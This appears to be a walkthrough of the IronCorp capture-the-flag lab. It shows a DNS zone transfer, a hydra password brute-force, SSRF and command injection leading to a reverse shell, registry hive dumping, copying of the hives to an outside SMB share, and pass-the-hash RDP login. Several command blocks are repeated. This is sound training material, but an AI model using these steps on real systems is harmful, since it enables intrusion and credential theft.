DNS port is open and we can perform zone transfer to retrieve the different DNS names:

┌──(kali㉿kali)-[~/Desktop/Labs/IronCorp]
└─$ dig axfr ironcorp.me @10.80.159.249

; <<>> DiG 9.20.15-2-Debian <<>> axfr ironcorp.me @10.80.159.249
;; global options: +cmd
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
admin.ironcorp.me.	3600	IN	A	127.0.0.1
internal.ironcorp.me.	3600	IN	A	127.0.0.1
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 395 msec
;; SERVER: 10.80.159.249#53(10.80.159.249) (TCP)
;; WHEN: Sun Mar 29 16:55:05 EDT 2026
;; XFR size: 5 records (messages 1, bytes 238)
┌──(kali㉿kali)-[~/Desktop/Labs/IronCorp]
└─$ dig axfr ironcorp.me @10.80.159.249

Accessing the admin.ironcorp.me:11025 presents a HTTP GET login page:

┌──(kali㉿kali)-[~/Desktop/Labs/IronCorp]
└─$ curl -I http://admin.ironcorp.me:11025/
HTTP/1.1 401 Unauthorized
Date: Sun, 29 Mar 2026 21:14:39 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
WWW-Authenticate: Basic realm="My Protected Area"
Vary: accept-language,accept-charset
Accept-Ranges: bytes
Content-Type: text/html; charset=utf-8
Content-Language: en
┌──(kali㉿kali)-[~/Desktop/Labs/IronCorp]
└─$ curl -I http://admin.ironcorp.me:11025/
HTTP/1.1 401 Unauthorized
Date: Sun, 29 Mar 2026 21:14:39 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
WWW-Authenticate: Basic realm="My Protected Area"
Vary: accept-language,accept-charset
Accept-Ranges: bytes
Content-Type: text/html; charset=utf-8
Content-Language: en

Trying to find any possible usernames is not successful either. The only default username I can think of is admin. Using this username, I bruteforced the password of the admin.ironcorp.me to obtain password123:

┌──(kali㉿kali)-[~/Desktop/Labs/IronCorp]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt admin.ironcorp.me -s 11025 http-get /   
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-29 17:34:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://admin.ironcorp.me:11025/
[11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-29 17:35:00

Access the internal application using the bruteforced credentials:

It looks like a search feature. However, nothing is output.

When testing for various web vulnerabilities, I had no luck until I tried SSRF:

As shown in the image above, the web application successfully makes a call to my machine on port 80.

When using the file protocol, I notice it is possible to include the hosts file:

Querying the internal.ironcorp.me returns the following webpage:

And now I have the username on the host called Equinox:

From the previous output, I learned the location of the script. When including this file, I notice it is including our input from name parameter and executing it:

This is vulnerable to command injection.

After multiple attempt, I managed to exploit the command injection vulnability to run ipconfig:

Also the web application is being executed with SYSTEM privileges:

Deploy a base64 encoded PowerShell reverse shell to obtain initial access on the machine:

The user.txt flag:

PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/28/2020  12:39 PM             37 user.txt                      


PS C:\Users\Administrator\Desktop> more user.txt
thm{09b408056a13fc222f33e6e4cf599f8c}

PS C:\Users\Administrator\Desktop> 

PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        3/28/2020  12:39 PM             37 user.txt                      


PS C:\Users\Administrator\Desktop> more user.txt
thm{09b408056a13fc222f33e6e4cf599f8c}

PS C:\Users\Administrator\Desktop>

Copy over the three hives and disable the restricted admin mode:

PS C:\Temp> reg.exe save hklm\sam sam.save
The operation completed successfully.

PS C:\Temp> reg.exe save hklm\security security.save
The operation completed successfully.

PS C:\Temp> reg.exe save hklm\system system.save
The operation completed successfully.

PS C:\Temp> copy sam.save //192.168.223.201/share
PS C:\Temp> copy security.save //192.168.223.201/share
PS C:\Temp> copy system.save //192.168.223.201/share
PS C:\Temp> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

PS C:\Temp> reg.exe save hklm\sam sam.save
The operation completed successfully.

PS C:\Temp> reg.exe save hklm\security security.save
The operation completed successfully.

PS C:\Temp> reg.exe save hklm\system system.save
The operation completed successfully.

PS C:\Temp> copy sam.save //192.168.223.201/share
PS C:\Temp> copy security.save //192.168.223.201/share
PS C:\Temp> copy system.save //192.168.223.201/share
PS C:\Temp> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

Dump the credentials from the three hives:

Perform PtH as the user Admin to gain access to the machine:

┌──(kali㉿kali)-[~/Desktop/Labs/IronCorp]
└─$ xfreerdp3 /u:Admin /pth:25f46396c818314f78cafba3fd1e5596 /v:ironcorp.me /dynamic-resolution
....SNIP...
┌──(kali㉿kali)-[~/Desktop/Labs/IronCorp]
└─$ xfreerdp3 /u:Admin /pth:25f46396c818314f78cafba3fd1e5596 /v:ironcorp.me /dynamic-resolution
....SNIP...

And the root.txt flag is located on the desktop:
